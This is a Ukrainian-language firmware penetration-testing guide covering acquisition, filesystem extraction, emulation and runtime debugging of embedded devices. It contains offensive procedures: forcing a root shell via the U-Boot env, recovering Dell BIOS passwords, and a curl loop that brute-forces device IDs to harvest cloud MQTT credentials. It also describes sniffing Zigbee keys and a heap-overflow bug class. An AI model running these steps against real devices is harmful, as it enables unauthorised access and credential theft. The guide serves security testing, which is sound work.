Прошивка — це необхідне програмне забезпечення, яке забезпечує належну роботу пристроїв, керуючи взаємодією між апаратними компонентами та програмним забезпеченням, з яким взаємодіють користувачі. Вона зберігається в постійній пам’яті, завдяки чому пристрій має доступ до важливих інструкцій відразу після ввімкнення, що приводить до запуску операційної системи. Аналіз прошивки та потенційне внесення до неї змін — важливий етап виявлення вразливостей безпеки.<sup>[[2]](#references)[[3]](#references)</sup>

## **Збір інформації**

**Збір інформації** — важливий початковий етап для розуміння складових пристрою та використовуваних ним технологій. Цей процес передбачає збирання даних про:

- Архітектуру CPU та операційну систему, на якій він працює
- Особливості bootloader
- Апаратну конфігурацію та технічну документацію
- Метрики кодової бази та розташування вихідного коду
- Зовнішні бібліотеки та типи ліцензій
- Історію оновлень і сертифікати відповідності нормативним вимогам
- Архітектурні діаграми та діаграми потоків
- Оцінки безпеки та виявлені вразливості

Для цього надзвичайно корисні інструменти **розвідки з відкритих джерел (OSINT)**, а також аналіз будь-яких доступних компонентів програмного забезпечення з відкритим кодом за допомогою ручного й автоматизованого аналізу. Такі інструменти, як [Coverity Scan](https://scan.coverity.com) і [LGTM від Semmle](https://lgtm.com/#explore), надають безкоштовний статичний аналіз, який можна використовувати для пошуку потенційних проблем.

## **Отримання прошивки**

Прошивку можна отримати різними способами, кожен з яких має свій рівень складності:

- **Безпосередньо** з джерела (розробників, виробників)
- **Зібрати** її за наданими інструкціями
- **Завантажити** з офіційних сайтів підтримки
- Використовувати запити **Google dork**, щоб знайти розміщені файли прошивки
- Отримати прямий доступ до **хмарного сховища** за допомогою таких інструментів, як [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Перехопити **оновлення** за допомогою технік man-in-the-middle
- **Витягти** з пристрою через такі інтерфейси, як **UART**, **JTAG** або **PICit**
- **Перехопити** запити на оновлення в обміні даними пристрою
- Знайти та використати **жорстко закодовані кінцеві точки оновлення**
- **Зняти дамп** із bootloader або з мережі
- Якщо нічого іншого не допомогло, **зняти та зчитати** чип пам’яті за допомогою відповідних апаратних засобів

### Логи лише через UART: примусово запустити root shell через середовище U-Boot у флеш-пам’яті

Якщо UART RX ігнорується (доступні лише логи), усе одно можна примусово запустити init shell, **відредагувавши blob середовища U-Boot в автономному режимі**:<sup>[[6]](#references)</sup>

1. Зняти дамп SPI flash за допомогою кліпси SOIC-8 і програматора (3,3 В):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Знайдіть розділ env U-Boot, відредагуйте `bootargs`, додавши `init=/bin/sh`, і **перерахуйте CRC32 env U-Boot** для blob.
3. Перепрошийте лише розділ env і перезавантажте пристрій; у UART має з’явитися shell.

Це корисно для вбудованих пристроїв, на яких shell завантажувача вимкнено, але до розділу env можна записувати через зовнішній доступ до flash-пам’яті.

## Аналіз прошивки

Тепер, коли **у вас є прошивка**, потрібно отримати інформацію про неї, щоб зрозуміти, як із нею працювати. Для цього можна використати різні інструменти:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Якщо за допомогою цих інструментів не вдається знайти багато інформації, перевірте **ентропію** образу за допомогою `binwalk -E <bin>`: низька ентропія означає, що образ навряд чи зашифрований. Висока ентропія означає, що він, імовірно, зашифрований (або стиснутий у певний спосіб).

### Диференційний аналіз flash і відновлювані сховища секретів XOR

Якщо формат зберігання параметра firmware не задокументований, спочатку зробіть кілька однакових зчитувань flash, змініть **рівно один** параметр, знову зчитайте весь chip і порівняйте зміщення. Повторення експерименту з контрольованими значеннями допоможе відрізнити цей параметр від лічильників і метаданих запису; зміни за новими зміщеннями, а не на місці, вказують на сховище лише для додавання або журналоподібну структуру. Зберігайте видалені чи позначені як видалені записи, оскільки їхні байти даних можуть залишатися відновлюваними.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Після визначення області витягніть модулі firmware за допомогою таких інструментів, як `binwalk`, і проаналізуйте writer/validator у Ghidra. Перевірте межі полів, padding, індексацію ключа та derivation ключа в коді, а не робіть висновки про схему лише за шаблонами шифротексту.<sup>[[12]](#references)</sup>

#### Відновлення ключів з encrypted zero padding

Як описано в [XOR-based encryption](../../crypto/symmetric/#xor-based-encryption), відомий відкритий текст дає змогу отримати байти keystream на тих самих позиціях. Поле фіксованого розміру особливо вразливе, якщо його zero padding охоплює всі індекси циклічного XOR-ключа: encrypted padding безпосередньо розкриває ці байти ключа, оскільки `0x00 XOR key_byte = key_byte`. Якщо охоплено всі індекси ключа, відновіть ключ із кінця ciphertext і розшифруйте заповнені байти.<sup>[[12]](#references)</sup>

Вразливий формат пароля BIOS DVAR від Dell — наочний приклад: байт `0` 32-байтового поля зберігається у відкритому вигляді, а для байтів `1..31` використовується циклічний 20-байтовий ключ.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Для пароля довжини `L` позиції `L..31` до XOR були нульовими. Коли `L <= 12`, ці позиції охоплюють усі індекси ключа, тож повний ключ і пароль можна відновити без перебору:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Відновлення ключів з історичних записів

Не аналізуйте кожен запис окремо. Ключ DVAR приблизно обчислюється як `modified_md5(device_seed || variable_GUID || password[0])`: seed пристрою та GUID незмінні, а єдиний залежний від пароля вхідний параметр — відкритий перший байт. Це дає не більше 256 ключів на пристрій, тому записи, що починаються з однакового байта, використовують спільний ключ. Згрупуйте активні та видалені записи за цим байтом; короткий історичний запис може розкрити повний ключ через padding і дозволити розшифрувати поточний довший запис, власного padding якого недостатньо. Тому ротація пароля може збільшити ризик витоку, якщо старий зашифрований текст позначено як видалений, а не стерто.<sup>[[12]](#references)</sup>

Інструмент [`dellpwn`](https://github.com/R3n5k1/dellpwn) знаходить DVAR, перевіряє кандидатні записи, відновлює паролі та може показувати сирі байти збережених даних і ключів. Зберіть його з checkout і проскануйте перевірений образ flash так:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Для власних парсерів відсіюйте хибні спрацьовування за структурою записів, обмеженнями на друковані символи, перевірками нульового доповнення, ентропією ключа та узгодженістю в місці циклічного переходу ключа. Якщо повторні дампи показують поодинокі зміни бітів для кожного запису, перелічіть виявлені маски й ранжуйте виправлення за цими обмеженнями, але неоднозначні символи позначайте як неоднозначні, а не подавайте евристичний результат як точне відновлення.<sup>[[12]](#references)</sup>

Замість оборотного шифротексту верифікатори паролів мають зберігати хеш із сіллю, обчислений за допомогою ітераційного одностороннього хешування, а сховища з журналюванням мають безпечно видаляти застарілі секретні дані.<sup>[[12]](#references)</sup>

### Отримання файлової системи

За допомогою згаданих вище інструментів із коментарів, наприклад `binwalk -ev <bin>`, ви мали змогу **витягти файлову систему**.\
Зазвичай Binwalk витягує її в **папку з назвою типу файлової системи**; найчастіше це один із таких типів: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Ручне отримання файлової системи

Іноді Binwalk **не має сигнатури магічних байтів файлової системи**. У таких випадках скористайтеся Binwalk, щоб **знайти зсув файлової системи та вирізати стиснуту файлову систему** з бінарного файлу, а потім **вручну витягти** її відповідно до типу, виконавши наведені нижче кроки.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Запустіть наведену нижче **dd command**, щоб виконати carving файлової системи Squashfs.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Альтернативно, також можна виконати таку команду.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Для squashfs (використовується у прикладі вище)

`$ unsquashfs dir.squashfs`

Після цього файли будуть у каталозі "`squashfs-root`".

- Файли архівів CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Для файлових систем jffs2

`$ jefferson rootfsfile.jffs2`

- Для файлових систем ubifs із NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Відновлення розділених вбудованих кореневих файлових систем

Якщо дамп raw eMMC/SSD містить коректний заголовок файлової системи, але її метадані вказують на зміщення за межами номінального розділу, не поспішайте вважати її пошкодженою. Вбудований код завантаження може збирати справжній кореневий пристрій із кількох фізичних діапазонів за допомогою Device Mapper, тому вилучення даних з одного розділу GPT дасть лише перший сегмент.<sup>[[9]](#references)</sup>

#### Первинний аналіз повного образу носія

Спершу переконайтеся, що отримання даних завершилося, розмір стабільний і жоден процес запису більше не використовує образ. Якщо назва файла містить початкову й кінцеву адреси, порівняйте цей діапазон із фактичною кількістю байтів. Відновіть GPT у режимі лише для читання та підключіть лише потрібний діапазон; **не** запускайте `vgchange -ay` для ненадійного фізичного тому на робочій станції, оскільки можливі конфлікти груп томів і ненавмисний запис даних.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Віддавайте перевагу одноразовій VM, якщо оригінальна логіка init або стек LVM має бачити весь образ. Історичні журнали завантаження зі стандартного розділу завантаження особливо корисні: bootloader міг записати зсуви в proprietary-контейнері, довжини компонентів, вибір слота, правила вирівнювання та результати перевірки підпису. Використовуйте ці значення, щоб вирізати вбудований командний рядок, ядро та initramfs, а потім окремо перевірте кожен результат за допомогою `file`, magic bytes і `binwalk`; читання до кінця контейнера може випадково додати до ядра initrd, об'єкт ACPI або підпис.<sup>[[9]](#references)</sup>

#### Відновлення карти блокових пристроїв під час завантаження

Витягніть initramfs ядра та виконайте reverse engineering для його `/init` і будь-яких бібліотек для роботи зі сховищем. У [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/) шукайте посилання на рядки `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` і шляхи до розділів; потім простежте код, який вибирає активний слот A/B і створює таблицю. Корисні початкові команди radare2: `r2 -A init`, `afl`, `pdf @ main` і `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

Ціль linear відображає послідовні діапазони віртуального пристрою на діапазони одного або кількох базових пристроїв. Відновлена таблиця з двох сегментів зазвичай має такий вигляд (усі позиції та довжини вказано в секторах по 512 байтів):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Відтворюйте арифметику машинного коду точно, зокрема ширину цілих чисел, зсуви та перетворення одиниць. Наприклад, такий вираз округлює розмір у байтах донизу до межі 4 КіБ і лише після цього перетворює його на сектори по 512 байтів; заміна на `p4_bytes // 512` зсуває вибраний кінцевий фрагмент на `p4_bytes % 4096`, якщо розділ не вирівняний за сторінкою.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Відновіть плоский образ для аналізу, копіюючи діапазони в порядку таблиці обмеженими блоками, а не завантажуючи весь дамп носія в пам’ять. Це також дає змогу не створювати пристрої mapper на хості. Залиште отримані з GPT зміщення, обернені кількості секторів і кінцеву довжину вихідного файла окремими твердженнями.<sup>[[9]](#references)</sup>

#### Відрізняйте пошкодження від сталої помилки реконструкції

Для SquashFS перевірте magic `hsqs` і декодуйте 64-бітне little-endian поле `bytes_used` за зміщенням 40 у суперблоці, перш ніж запускати `unsquashfs`. Якщо під час видобування виникають помилки в кількох не пов’язаних між собою структурах, шукайте в широкому діапазоні навколо очікуваних позицій і вимагайте переконливих структурних кандидатів: блок метаданих, який вдається розпакувати, кілька послідовних коректних записів каталогу, правдоподібні поля inode, кореневий inode, узгоджений із кількістю inode, або коректну структуру метаданих цілісності. Одного збігу magic недостатньо.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Коли та сама знакова дельта робить валідними незалежні структури — наприклад, метадані каталогу та запис verity, — імовірною причиною є систематична помилка у визначенні початку сегмента, а не відсутні байти. Поверніться до зворотного обчислення та перевірте, чи не було відкинуто залишки, чи правильно враховано знаковість і переповнення, а також чи коректно виконано округлення до секторів або сторінок, перш ніж намагатися відновлювати втрачені дані або виправляти метадані файлової системи.<sup>[[9]](#references)</sup>

Нарешті, не змішуйте межі захисту: томи LUKS із ключами, запечатаними в TPM, захищають конфіденційність даних, тоді як підписане зіставлення dm-verity захищає цілісність кореневої файлової системи. Програмний TPM не відновить ключ, запечатаний у початковому фізичному TPM, а завантаження зміненого SquashFS через дослідницький init, який пропускає перевірку verity, не підробляє його підпис і не порушує роботу dm-verity.<sup>[[9]](#references)</sup>

## Аналіз прошивки

Після отримання прошивки важливо дослідити її структуру та потенційні вразливості. Для цього використовують різні інструменти, щоб проаналізувати образ прошивки й отримати з нього корисні дані.

### Інструменти для початкового аналізу

Нижче наведено набір команд для початкового аналізу бінарного файла (позначеного як `<bin>`). Ці команди допомагають визначити типи файлів, витягти рядки, проаналізувати бінарні дані, а також з’ясувати відомості про розділи й файлові системи:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Щоб оцінити стан шифрування образу, перевіряють **ентропію** за допомогою `binwalk -E <bin>`. Низька ентропія вказує на відсутність шифрування, тоді як висока може свідчити про шифрування або стиснення.

Для вилучення **вбудованих файлів** рекомендуються такі інструменти й ресурси, як документація **file-data-carving-recovery-tools** і **binvis.io** для перегляду файлів.

### Вилучення файлової системи

За допомогою `binwalk -ev <bin>` зазвичай можна вилучити файлову систему, часто до каталогу, названого за типом файлової системи (наприклад, squashfs, ubifs). Однак, коли **binwalk** не розпізнає тип файлової системи через відсутність magic bytes, потрібно виконати вилучення вручну. Для цього за допомогою `binwalk` знаходять зміщення файлової системи, а потім командою `dd` вирізають її:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Після цього, залежно від типу файлової системи (наприклад, squashfs, cpio, jffs2, ubifs), для ручного витягування вмісту використовують різні команди.

### Аналіз файлової системи

Після витягування файлової системи починається пошук вразливостей. Перевіряють незахищені мережеві демони, жорстко закодовані облікові дані, API endpoints, функції сервера оновлень, нескомпільований код, скрипти запуску та скомпільовані бінарні файли для офлайн-аналізу.

**Ключові розташування** та **елементи** для перевірки:

- **etc/shadow** і **etc/passwd** — облікові дані користувачів
- SSL-сертифікати та ключі в **etc/ssl**
- Файли конфігурації та скрипти на наявність потенційних вразливостей
- Вбудовані бінарні файли для подальшого аналізу
- Поширені вебсервери та бінарні файли IoT-пристроїв

Для виявлення конфіденційної інформації та вразливостей у файловій системі допомагають кілька інструментів:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) і [**Firmwalker**](https://github.com/craigz28/firmwalker) — для пошуку конфіденційної інформації
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) — для комплексного аналізу firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) і [**EMBA**](https://github.com/e-m-b-a/emba) — для статичного та динамічного аналізу

### Перевірка безпеки скомпільованих бінарних файлів

На наявність вразливостей потрібно перевіряти як вихідний код, так і скомпільовані бінарні файли, знайдені у файловій системі. Такі інструменти, як **checksec.sh** для Unix-бінарних файлів і **PESecurity** для Windows-бінарних файлів, допомагають виявити незахищені бінарні файли, які можна експлуатувати.

## Збір cloud-конфігурації та облікових даних MQTT за допомогою похідних URL-токенів

Багато IoT-хабів отримують конфігурацію для кожного пристрою з cloud endpoint, що має такий вигляд:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Під час аналізу firmware можна виявити, що `<token>` локально генерується з ідентифікатора пристрою за допомогою жорстко закодованого секрету, наприклад:

- token = MD5( deviceId || STATIC_KEY ) і подається у вигляді hex у верхньому регістрі

Така схема дає змогу будь-кому, хто дізнався deviceId і STATIC_KEY, відновити URL і отримати cloud-конфігурацію, у якій часто містяться облікові дані MQTT у відкритому вигляді та префікси topic.

Практичний порядок дій:

1) Витягніть deviceId з журналів завантаження UART

- Під’єднайте адаптер UART на 3,3 В (TX/RX/GND) і перехопіть журнали:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Знайдіть рядки, що виводять шаблон URL конфігурації cloud і адресу брокера, наприклад:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Відновіть STATIC_KEY і алгоритм токена з firmware

- Завантажте бінарні файли в Ghidra/radare2 і знайдіть шлях до конфігурації ("/pf/") або використання MD5.
- Підтвердьте алгоритм (наприклад, MD5(deviceId||STATIC_KEY)).
- Обчисліть токен у Bash і переведіть дайджест у верхній регістр:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Здобудьте конфігурацію хмари та облікові дані MQTT

- Сформуйте URL і завантажте JSON за допомогою curl; розберіть його за допомогою jq, щоб витягти секрети:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Зловживайте незашифрованим MQTT і слабкими ACL для топіків (якщо є)

- Використовуйте відновлені облікові дані, щоб підписатися на топіки обслуговування та шукати конфіденційні події:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Переберіть передбачувані ID пристроїв (у масштабі, з дозволом)

- У багатьох екосистемах вбудовано байти OUI/продукту/типу постачальника, за якими йде послідовний суфікс.
- Можна перебирати можливі ID, програмно генерувати токени й отримувати конфігурації:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Нотатки
- Завжди отримуйте явний дозвіл перед спробами масового enumeration.
- За можливості віддавайте перевагу емуляції або статичному аналізу для отримання секретів без модифікації цільового обладнання.

Емуляція firmware дає змогу виконувати **dynamic analysis** роботи пристрою або окремої програми. Такий підхід може зіткнутися з проблемами, пов’язаними із залежностями від обладнання чи архітектури, але перенесення кореневої файлової системи або окремих бінарних файлів на пристрій із відповідною архітектурою та порядком байтів, наприклад Raspberry Pi, або на попередньо створену віртуальну машину може спростити подальше тестування.

### Емуляція окремих бінарних файлів

Для аналізу окремих програм важливо визначити порядок байтів і архітектуру CPU програми.

#### Приклад з архітектурою MIPS

Щоб емулювати бінарний файл для архітектури MIPS, можна скористатися командою:

```bash
file ./squashfs-root/bin/busybox
```

А щоб встановити необхідні інструменти емуляції:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Для MIPS (big-endian) використовується `qemu-mips`, а для little-endian бінарних файлів підійде `qemu-mipsel`.

#### Емуляція архітектури ARM

Для бінарних файлів ARM процес подібний: для емуляції використовується емулятор `qemu-arm`.

### Емуляція всієї системи

Такі інструменти, як [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) та інші, дають змогу повністю емулювати firmware, автоматизуючи цей процес і сприяючи динамічному аналізу.

### Відновлення розділених і перевірених кореневих файлових систем для емуляції

Якщо superblock SquashFS читається, але зміщення inode, каталогів або таблиці фрагментів неможливі, не поспішайте виправляти `unsquashfs`. Зробіть реверс-інжиніринг бінарного файлу раннього етапу завантаження та відтворіть граф блочних пристроїв, який він створює: вбудовані системи можуть мати номінальний кореневий розділ, але формувати реальну файлову систему за допомогою відображення `dm-linear`, яке додає сектори, запозичені з іншого розділу. Перевірки лише superblock можуть пройти успішно, навіть якщо всі подальші блоки метаданих зміщені.<sup>[[11]](#references)</sup>

Зберігайте арифметику firmware точно. Зокрема, з’ясуйте, чи довжини задані в байтах, секторах по 512 байтів або сторінках по 4 KiB; відтворіть зсуви й обрізання в початковому порядку; врахуйте залежні від банку кінцеві ділянки в схемах A/B. Наприклад, `(partition_bytes >> 12) << 3` спершу обрізає значення до межі 4 KiB і лише потім виражає результат у секторах по 512 байтів; заміна цього виразу на `partition_bytes // 512` може змістити додану область на кілька кілобайтів і пошкодити всі наступні таблиці SquashFS.<sup>[[11]](#references)</sup>

Корисний процес перевірки:<sup>[[11]](#references)</sup>

1. Визначте джерело, початковий сектор і довжину кожного сегмента `dm-linear` за бінарним файлом verifier/init.
2. Об’єднайте або відобразіть ділянки, не змінюючи семантику їхнього вирівнювання.
3. Якщо розпакування все ще не вдається, виконайте пошук лише в невеликому діапазоні навколо прогнозованої межі та вимагайте наявності кількох послідовних коректних структур метаданих, а не покладайтеся лише на правдоподібний superblock.
4. Запустіть незмінений `unsquashfs` для відновленого образу; успішний обхід усіх каталогів і фрагментів є переконливішим доказом, ніж результат `unsquashfs -stat`.

#### Заміна dm-verity під контролем аналітика

Якщо аналітик контролює ядро QEMU, initramfs і віртуальні диски, змінений root можна завантажити, замінивши PID 1 для перевірки виробника на невеликий статично скомпонований init. Це **підміна ланцюжка завантаження в лабораторії**, а не злам dm-verity, його RSA-підпису, Secure Boot чи ключа, запечатаного TPM.<sup>[[11]](#references)</sup>

Замінний init має відтворювати операційні частини початкового процесу завантаження: змонтувати `devtmpfs`, викликати `setsid()`, під’єднати `/dev/console` до файлових дескрипторів 0–2, змонтувати `/proc` і `/sys`, дочекатися наданого блочного пристрою, змонтувати відредагований root лише для читання, від’єднати псевдофайлові системи старого root, перемістити нове монтування до `/` за допомогою `MS_MOVE`, виконати `chroot` і `execve()` для початкового `/sbin/init` firmware. Від’єднання `/dev`, `/proc` і `/sys` **до** `MS_MOVE` запобігає випадковому від’єднанню точок монтування, що належать новому root.<sup>[[11]](#references)</sup>

Зберігайте змінюваний стан пристрою окремо від зміненого незмінного root. Overlay qcow2 може зберегти стан LVM оригінального диска, тоді як другий virtio-диск, змонтований лише для читання, міститиме відредагований SquashFS:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Налагодження стану автономного образу

Перевіряйте постійний стан поза гостьовою системою, якщо повільне завантаження, деструктивні скрипти запуску або ненадійне журналювання консолі ускладнюють пошук причини збою. Ніколи не підключайте overlay, який використовує запущена VM; надайте до нього доступ за допомогою `qemu-nbd`, обмежте виявлення LVM потрібним розділом NBD і деактивуйте групу томів перед відключенням.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Для відтворюваної ізоляції несправностей записуйте файли-маркери з часовими мітками на стабільний том із правом запису та перевіряйте їх офлайн; `/dev/kmsg`, FIFO та тимчасові консолі можуть давати хибнонегативні результати через обмеження частоти повідомлень або передчасне завершення процесу. Також порівнюйте точні інтерфейси між рівнями, перш ніж змінювати не пов’язаний із проблемою код: `uname -r` і `/lib/modules/`, функції ext4 на диску та конфігурацію ядра, а також покоління Mesa `libGL` і ABI драйвера DRI та назви драйверів, визначені за PCI. Компонент може існувати й навіть успішно завантажуватися через `dlopen()`, але залишатися непридатним до використання, якщо його споживач очікує інший ABI.<sup>[[11]](#references)</sup>

## Практичний динамічний аналіз

На цьому етапі для аналізу використовують реальне або емуляційне середовище пристрою. Важливо зберегти доступ до ОС і файлової системи через shell. Емуляція може не повністю відтворювати взаємодію з обладнанням, тому іноді її доводиться перезапускати. Під час аналізу слід повторно дослідити файлову систему, exploit доступні вебсторінки й мережеві служби, а також вивчити вразливості bootloader. Перевірки цілісності firmware мають вирішальне значення для виявлення потенційних вразливостей типу backdoor.

## Методи аналізу під час виконання

Аналіз під час виконання передбачає взаємодію з процесом або бінарним файлом у його робочому середовищі. Для встановлення точок зупинки та виявлення вразливостей за допомогою fuzzing та інших методів використовують такі інструменти, як gdb-multiarch, Frida та Ghidra.

Для вбудованих цілей, де немає повноцінного налагоджувача, **скопіюйте на пристрій статично скомпонований `gdbserver` і під’єднайтеся до нього віддалено**:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Зіставлення повідомлень Zigbee / radio-co-processor

У IoT-хабах RF-стек часто розділений між **радіо MCU** та процесом Linux userland. Корисний робочий процес — зіставити такий шлях:<sup>[[8]](#references)</sup>

1. **RF-кадр** в ефірі
2. **Парсер на стороні контролера** на радіо MCU
3. **Текстовий або TLV-протокол через serial/UART**, що передається в Linux (наприклад, `/dev/tty*`)
4. **Диспетчер застосунку** в основному daemon
5. **Обробник, специфічний для протоколу / state machine**

У цій архітектурі є дві цілі для реверсингу замість однієї. Якщо контролер перетворює двійкові радіокадри на текстовий протокол, як-от `Group,Command,arg1,arg2,...`, з’ясуйте:

- **Групи повідомлень** і таблиці диспетчеризації
- Які повідомлення можуть надходити з **мережі**, а які — безпосередньо від контролера
- Точні **поля-дискримінатори виробника** (наприклад, Zigbee `manufacturer_code` і власний `cluster_command`)
- Які обробники доступні лише під час **commissioning**, виявлення або завантаження firmware/model

Для Zigbee перехопіть трафік pairing і перевірте, чи ціль досі використовує стандартний **Link Key** `ZigBeeAlliance09`. Якщо так, перехоплення трафіку commissioning може розкрити **Network Key**. Коди встановлення Zigbee 3.0 зменшують цей ризик, тож зафіксуйте, чи тестований пристрій справді примусово вимагає їх.

### Обробники протоколів виробника та доступність, обмежена FSM

Власні команди Zigbee/ZCL часто є кращою ціллю, ніж стандартизовані кластери, оскільки вони передають керування **власному коду парсингу** та внутрішнім **FSM**, де валідацію перевіряли менш ретельно.<sup>[[8]](#references)</sup>

Практичний робочий процес:

- Виконуйте реверсинг диспетчера команд, доки не знайдете **обробник лише для команд виробника**.
- Відновіть таблиці **станів FSM**, **подій**, **перевірок**, **дій** і **наступних станів**.
- Визначте **перехідні стани**, що переходять далі автоматично, а також гілки повторних спроб/помилок, які зрештою скидають або звільняють контрольований атакувальником стан.
- З’ясуйте, які легітимні обміни протоколу потрібні, щоб перевести daemon у вразливий стан, а не припускайте, що до вразливого обробника завжди можна дістатися.

Для протоколів, чутливих до часу, повторне відтворення пакетів із Python-фреймворку може бути надто повільним. Надійніший підхід — емулювати легітимний пристрій на справжньому обладнанні (наприклад, **nRF52840**) зі стеком виробничого класу, щоб забезпечити правильні **endpoints**, **attributes** і таймінги commissioning.

### Клас помилок у фрагментованих завантаженнях в embedded daemon

У firmware регулярно трапляється клас помилок у фрагментованих завантаженнях blob/model/configuration:<sup>[[8]](#references)</sup>

1. **Перший фрагмент** (`offset == 0`) зберігає `ctx->total_size` і виділяє пам’ять через `malloc(total_size)`.
2. Наступні фрагменти перевіряють лише контрольовані атакувальником поля **поточного пакета**, наприклад `packet_total_size >= offset + chunk_len`.
3. Копіювання виконується через `memcpy(&ctx->buffer[offset], chunk, chunk_len)` без перевірки щодо **початкового розміру виділеного буфера**.

Це дає змогу атакувальнику надіслати:

- Перший коректний фрагмент із **малим** заявленим загальним розміром, щоб примусити виділити невеликий блок heap.
- Пізніший фрагмент із **очікуваним offset**, але більшим `chunk_len`.
